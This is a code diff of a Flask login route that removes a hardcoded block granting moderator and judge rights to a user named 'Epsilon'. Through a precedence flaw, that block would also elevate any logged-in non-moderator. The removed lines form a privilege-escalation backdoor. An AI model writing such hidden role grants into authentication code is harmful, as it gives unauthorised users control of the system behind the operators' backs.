@@ -29,13 +29,6 @@ def login():
                 session['allowTracking'] = user.allowTracking
                 session['isMod'] = user.isMod
                 session['isJudge'] = user.isJudge
-                if user.alias == 'Epsilon' and not user.isJudge or not user.isMod:
-                    user.isJudge = True
-                    user.isMod = True
-                    user.save()
-                    session['isJudge'] = True
-                    session['isMod'] = True
-
                 return redirect(url_for('index'))
             else:
                 flash('Wrong password')
